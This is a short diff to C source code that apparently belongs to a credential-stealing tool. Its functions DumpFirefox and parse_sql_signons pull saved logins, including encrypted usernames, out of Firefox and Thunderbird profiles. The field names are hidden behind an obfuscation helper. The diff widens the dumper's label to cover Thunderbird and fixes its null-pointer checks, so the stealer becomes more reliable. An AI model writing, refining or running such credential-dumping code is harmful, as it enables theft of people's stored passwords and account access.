@@ -649,7 +649,7 @@ int parse_sql_signons(void *NotUsed, int argc, char **argv, char **azColName)
 	
 	for(int i=0; i<argc; i++){
 		if (!strcmp(azColName[i], "hostname")) {
-			swprintf_s(ffentry.service, 255, L"Firefox");
+			swprintf_s(ffentry.service, 255, L"Firefox/Thunderbird");
 			_snwprintf_s(ffentry.resource, 255, _TRUNCATE, L"%S", argv[i]);
 		}
 		if (!strcmp(azColName[i], DeobStringA("I1pEePLIXb9IE1H0I"))) {  //"encryptedUsername"
@@ -764,12 +764,12 @@ int DumpFirefox(void)
 
 	ProfilePath = GetFFProfilePath();
 
-	if (ProfilePath && !DirectoryExists(ProfilePath)) 
+	if (!ProfilePath || !DirectoryExists(ProfilePath)) 
 		return 0;
 	
 	FFDir = GetFFLibPath();
 
-	if (FFDir && !DirectoryExists(FFDir)) 
+	if (!FFDir || !DirectoryExists(FFDir)) 
 		return 0;
 	
 	if (!InitFFLibs(FFDir))	
